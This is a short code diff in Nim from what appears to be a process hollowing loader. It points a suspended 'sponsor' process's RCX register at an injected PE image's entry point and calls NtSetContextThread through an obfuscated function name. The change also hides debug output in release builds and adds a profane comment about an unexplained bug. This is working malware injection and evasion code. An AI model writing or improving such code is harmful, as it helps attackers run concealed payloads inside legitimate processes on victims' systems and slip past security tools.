@@ -106,7 +106,12 @@ proc hollow2*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
         when not defined(release): echo "[-] Could not read from sponsor process PEB"
         quit()
     var entryPoint = cast[DWORD64](peImageImageBase) + cast[DWORD64](peImageEntryPoint)
-    echo "[i] Changing RCX register to point the new entrypoint: 0x" & $context.Rcx.toHex & " -> 0x" & $entryPoint.toHex
+    var x = context.Rcx #[
+    Here I've been experiencing the fucking wierdest BUG in the whole world of humanity
+    Don't know why, but if you remove this line, it would not work and you will never understand why
+    Wasted LOT of time here
+    ]# 
+    when not defined(release): echo "[i] Changing RCX register to point the new entrypoint: 0x" & $context.Rcx.toHex & " -> 0x" & $entryPoint.toHex
     context.Rcx = cast[DWORD64](entryPoint)
     if IGyhziwCULdezDSq( # NtSetContextThread
         sponsorThreadHandle, addr context
